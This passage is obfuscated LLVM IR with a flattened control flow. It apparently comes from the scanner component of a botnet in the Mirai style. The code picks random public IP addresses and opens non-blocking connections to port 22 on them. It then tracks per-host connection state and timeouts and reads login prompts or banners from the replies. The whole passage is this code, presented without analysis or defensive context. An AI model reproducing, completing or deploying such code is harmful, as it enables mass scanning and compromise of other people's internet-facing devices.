  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload386, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 8
  %107 = load i8*, i8** %106, align 8
  store i8* %107, i8** %11, align 8
  %108 = load i32, i32* %2, align 4
  %109 = sext i32 %108 to i64
  %.reload385 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload385, i64 %109
  %111 = bitcast %struct.telstate_t* %110 to i8*
  call void @llvm.memset.p0i8.i64(i8* %111, i8 0, i64 32, i32 16, i1 false)
  %112 = load i8*, i8** %11, align 8
  %113 = load i32, i32* %2, align 4
  %114 = sext i32 %113 to i64
  %.reload384 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload384, i64 %114
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %115, i32 0, i32 8
  store i8* %112, i8** %116, align 8
  %117 = call i32 @getRandomPublicIP()
  %118 = load i32, i32* %2, align 4
  %119 = sext i32 %118 to i64
  %.reload383 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload383, i64 %119
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %120, i32 0, i32 1
  store i32 %117, i32* %121, align 4
  store i32 1910107007, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %.reload382 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload382, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 5
  %127 = load i8, i8* %126, align 1
  %128 = add i8 %127, 1
  store i8 %128, i8* %126, align 1
  %129 = load i32, i32* %2, align 4
  %130 = sext i32 %129 to i64
  %.reload381 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload381, i64 %130
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %131, i32 0, i32 5
  %133 = load i8, i8* %132, align 1
  %134 = zext i8 %133 to i64
  %135 = icmp eq i64 %134, 13
  %136 = select i1 %135, i32 661612959, i32 1908002395
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %2, align 4
  %139 = sext i32 %138 to i64
  %.reload380 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload380, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 5
  store i8 0, i8* %141, align 1
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %.reload379 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload379, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = add i8 %146, 1
  store i8 %147, i8* %145, align 2
  store i32 1908002395, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %2, align 4
  %150 = sext i32 %149 to i64
  %.reload378 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload378, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 4
  %153 = load i8, i8* %152, align 2
  %154 = zext i8 %153 to i64
  %155 = icmp eq i64 %154, 4
  %156 = select i1 %155, i32 -119598988, i32 688848368
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32, i32* %2, align 4
  %159 = sext i32 %158 to i64
  %.reload377 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload377, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 3
  store i8 1, i8* %161, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  store i32 1910107007, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext 22) #13
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %165, i16* %166, align 2
  %167 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %168 = getelementptr inbounds [8 x i8], [8 x i8]* %167, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 8, i32 4, i1 false)
  %169 = load i32, i32* %2, align 4
  %170 = sext i32 %169 to i64
  %.reload376 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload376, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 %173, i32* %175, align 4
  %176 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %177 = load i32, i32* %2, align 4
  %178 = sext i32 %177 to i64
  %.reload375 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload375, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 0
  store i32 %176, i32* %180, align 16
  %181 = load i32, i32* %2, align 4
  %182 = sext i32 %181 to i64
  %.reload374 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload374, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 16
  %186 = bitcast %struct.timeval* %10 to i8*
  %187 = call i32 @setsockopt(i32 %185, i32 1, i32 20, i8* %186, i32 16) #2
  %188 = load i32, i32* %2, align 4
  %189 = sext i32 %188 to i64
  %.reload373 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload373, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = bitcast %struct.timeval* %10 to i8*
  %194 = call i32 @setsockopt(i32 %192, i32 1, i32 21, i8* %193, i32 16) #2
  %195 = load i32, i32* %2, align 4
  %196 = sext i32 %195 to i64
  %.reload372 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload372, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 16
  %200 = icmp eq i32 %199, -1
  %201 = select i1 %200, i32 -1212320882, i32 954409328
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i32, i32* %2, align 4
  %205 = sext i32 %204 to i64
  %.reload371 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload371, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 16
  %209 = load i32, i32* %2, align 4
  %210 = sext i32 %209 to i64
  %.reload370 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload370, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = call i32 (i32, i32, ...) @fcntl(i32 %213, i32 3, i8* null)
  %215 = or i32 %214, 2048
  %216 = call i32 (i32, i32, ...) @fcntl(i32 %208, i32 4, i32 %215)
  %217 = load i32, i32* %2, align 4
  %218 = sext i32 %217 to i64
  %.reload369 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload369, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 16
  %222 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %223 = call i32 @connect(i32 %221, %struct.sockaddr* %222, i32 16)
  %224 = icmp eq i32 %223, -1
  %225 = select i1 %224, i32 -444168033, i32 659181654
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = call i32* @__errno_location() #13
  %228 = load i32, i32* %227, align 4
  %229 = icmp ne i32 %228, 115
  %230 = select i1 %229, i32 1779057487, i32 659181654
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i32, i32* %2, align 4
  %233 = sext i32 %232 to i64
  %.reload368 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload368, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 16
  %237 = call i32 @sclose(i32 %236)
  %238 = load i32, i32* %2, align 4
  %239 = sext i32 %238 to i64
  %.reload367 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload367, i64 %239
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %240, i32 0, i32 3
  store i8 1, i8* %241, align 1
  store i32 1902906190, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i32, i32* %2, align 4
  %244 = sext i32 %243 to i64
  %.reload366 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload366, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 2
  store i8 1, i8* %246, align 8
  %247 = load i32, i32* %2, align 4
  %248 = sext i32 %247 to i64
  %.reload365 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload365, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 6
  store i32 0, i32* %250, align 4
  store i32 1902906190, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i32, i32* %2, align 4
  %254 = sext i32 %253 to i64
  %.reload364 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload364, i64 %254
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %255, i32 0, i32 6
  %257 = load i32, i32* %256, align 4
  %258 = icmp eq i32 %257, 0
  %259 = select i1 %258, i32 -55551702, i32 -1828150811
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = call i64 @time(i64* null) #2
  %262 = trunc i64 %261 to i32
  %263 = load i32, i32* %2, align 4
  %264 = sext i32 %263 to i64
  %.reload363 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload363, i64 %264
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %265, i32 0, i32 6
  store i32 %262, i32* %266, align 4
  store i32 -1828150811, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 -236954818, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %270 = getelementptr inbounds [16 x i64], [16 x i64]* %269, i64 0, i64 0
  %271 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %270) #2, !srcloc !6
  %272 = extractvalue { i64, i64* } %271, 0
  %273 = extractvalue { i64, i64* } %271, 1
  %274 = trunc i64 %272 to i32
  store i32 %274, i32* %12, align 4
  %275 = ptrtoint i64* %273 to i64
  %276 = trunc i64 %275 to i32
  store i32 %276, i32* %13, align 4
  store i32 -1337962136, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 246117140, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %2, align 4
  %280 = sext i32 %279 to i64
  %.reload362 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload362, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = srem i32 %283, 64
  %285 = zext i32 %284 to i64
  %286 = shl i64 1, %285
  %287 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %288 = load i32, i32* %2, align 4
  %289 = sext i32 %288 to i64
  %.reload361 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload361, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 0
  %292 = load i32, i32* %291, align 16
  %293 = sdiv i32 %292, 64
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds [16 x i64], [16 x i64]* %287, i64 0, i64 %294
  %296 = load i64, i64* %295, align 8
  %297 = or i64 %296, %286
  store i64 %297, i64* %295, align 8
  %298 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %298, align 8
  %299 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %299, align 8
  %300 = load i32, i32* %2, align 4
  %301 = sext i32 %300 to i64
  %.reload360 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload360, i64 %301
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %302, i32 0, i32 0
  %304 = load i32, i32* %303, align 16
  %305 = add nsw i32 %304, 1
  %306 = call i32 @select(i32 %305, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %306, i32* %3, align 4
  %307 = load i32, i32* %3, align 4
  %308 = icmp eq i32 %307, 1
  %309 = select i1 %308, i32 337501835, i32 -726451379
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %.reload359 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload359, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = bitcast i32* %7 to i8*
  %317 = call i32 @getsockopt(i32 %315, i32 1, i32 4, i8* %316, i32* %6) #2
  %318 = load i32, i32* %7, align 4
  %319 = icmp ne i32 %318, 0
  %320 = select i1 %319, i32 1432823680, i32 -300010941
  store i32 %320, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  %322 = load i32, i32* %2, align 4
  %323 = sext i32 %322 to i64
  %.reload358 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload358, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 16
  %327 = call i32 @sclose(i32 %326)
  %328 = load i32, i32* %2, align 4
  %329 = sext i32 %328 to i64
  %.reload357 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload357, i64 %329
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %330, i32 0, i32 2
  store i8 0, i8* %331, align 8
  %332 = load i32, i32* %2, align 4
  %333 = sext i32 %332 to i64
  %.reload356 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload356, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 3
  store i8 1, i8* %335, align 1
  store i32 -458884337, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %.reload355 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload355, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = load i32, i32* %2, align 4
  %343 = sext i32 %342 to i64
  %.reload354 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload354, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %344, i32 0, i32 0
  %346 = load i32, i32* %345, align 16
  %347 = call i32 (i32, i32, ...) @fcntl(i32 %346, i32 3, i8* null)
  %348 = and i32 %347, -2049
  %349 = call i32 (i32, i32, ...) @fcntl(i32 %341, i32 4, i32 %348)
  %350 = load i32, i32* %2, align 4
  %351 = sext i32 %350 to i64
  %.reload353 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload353, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 6
  store i32 0, i32* %353, align 4
  %354 = load i32, i32* %2, align 4
  %355 = sext i32 %354 to i64
  %.reload352 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload352, i64 %355
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %356, i32 0, i32 7
  store i16 0, i16* %357, align 16
  %358 = load i32, i32* %2, align 4
  %359 = sext i32 %358 to i64
  %.reload351 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload351, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 8
  %362 = load i8*, i8** %361, align 8
  call void @llvm.memset.p0i8.i64(i8* %362, i8 0, i64 1024, i32 1, i1 false)
  %363 = load i32, i32* %2, align 4
  %364 = sext i32 %363 to i64
  %.reload350 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload350, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 2
  store i8 2, i8* %366, align 8
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  store i32 1586450275, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i32, i32* %3, align 4
  %370 = icmp eq i32 %369, -1
  %371 = select i1 %370, i32 170043222, i32 238517393
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i32, i32* %2, align 4
  %374 = sext i32 %373 to i64
  %.reload349 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload349, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 0
  %377 = load i32, i32* %376, align 16
  %378 = call i32 @sclose(i32 %377)
  %379 = load i32, i32* %2, align 4
  %380 = sext i32 %379 to i64
  %.reload348 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload348, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 2
  store i8 0, i8* %382, align 8
  %383 = load i32, i32* %2, align 4
  %384 = sext i32 %383 to i64
  %.reload347 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload347, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 3
  store i8 1, i8* %386, align 1
  store i32 238517393, i32* %switchVar
  br label %loopEnd

; <label>:387:                                    ; preds = %loopEntry
  store i32 1586450275, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i32, i32* %2, align 4
  %390 = sext i32 %389 to i64
  %.reload346 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload346, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 6
  %393 = load i32, i32* %392, align 4
  %394 = add i32 %393, 10
  %395 = zext i32 %394 to i64
  %396 = call i64 @time(i64* null) #2
  %397 = icmp slt i64 %395, %396
  %398 = select i1 %397, i32 -954122973, i32 -1873224242
  store i32 %398, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = load i32, i32* %2, align 4
  %401 = sext i32 %400 to i64
  %.reload345 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload345, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 0
  %404 = load i32, i32* %403, align 16
  %405 = call i32 @sclose(i32 %404)
  %406 = load i32, i32* %2, align 4
  %407 = sext i32 %406 to i64
  %.reload344 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload344, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 2
  store i8 0, i8* %409, align 8
  %410 = load i32, i32* %2, align 4
  %411 = sext i32 %410 to i64
  %.reload343 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload343, i64 %411
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %412, i32 0, i32 3
  store i8 1, i8* %413, align 1
  store i32 -1873224242, i32* %switchVar
  br label %loopEnd

; <label>:414:                                    ; preds = %loopEntry
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load i32, i32* %2, align 4
  %417 = sext i32 %416 to i64
  %.reload342 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload342, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 6
  %420 = load i32, i32* %419, align 4
  %421 = icmp eq i32 %420, 0
  %422 = select i1 %421, i32 -1650534693, i32 629266885
  store i32 %422, i32* %switchVar
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %424 = call i64 @time(i64* null) #2
  %425 = trunc i64 %424 to i32
  %426 = load i32, i32* %2, align 4
  %427 = sext i32 %426 to i64
  %.reload341 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload341, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 6
  store i32 %425, i32* %429, align 4
  store i32 629266885, i32* %switchVar
  br label %loopEnd

; <label>:430:                                    ; preds = %loopEntry
  %431 = load i32, i32* %2, align 4
  %432 = sext i32 %431 to i64
  %.reload340 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload340, i64 %432
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %433, i32 0, i32 0
  %435 = load i32, i32* %434, align 16
  %436 = load i32, i32* %2, align 4
  %437 = sext i32 %436 to i64
  %.reload339 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload339, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 8
  %440 = load i8*, i8** %439, align 8
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %.reload338 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload338, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 7
  %445 = load i16, i16* %444, align 16
  %446 = zext i16 %445 to i32
  %447 = call i32 @readUntil(i32 %435, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %440, i32 1024, i32 %446)
  %448 = icmp ne i32 %447, 0
  %449 = select i1 %448, i32 -1988545098, i32 2090357575
  store i32 %449, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %.reload337 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload337, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 6
  store i32 0, i32* %454, align 4
  %455 = load i32, i32* %2, align 4
  %456 = sext i32 %455 to i64
  %.reload336 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload336, i64 %456
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %457, i32 0, i32 7
  store i16 0, i16* %458, align 16
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %.reload335 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload335, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 8
  %463 = load i8*, i8** %462, align 8
  %464 = call i8* @strstr(i8* %463, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %465 = icmp ne i8* %464, null
  %466 = select i1 %465, i32 -1377894766, i32 -1627083891
  store i32 %466, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %.reload334 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload334, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 2
  store i8 5, i8* %471, align 8
  store i32 1617894270, i32* %switchVar
  br label %loopEnd

; <label>:472:                                    ; preds = %loopEntry
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %.reload333 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload333, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 8
  %477 = load i8*, i8** %476, align 8
  call void @llvm.memset.p0i8.i64(i8* %477, i8 0, i64 1024, i32 1, i1 false)
  store i32 1617894270, i32* %switchVar
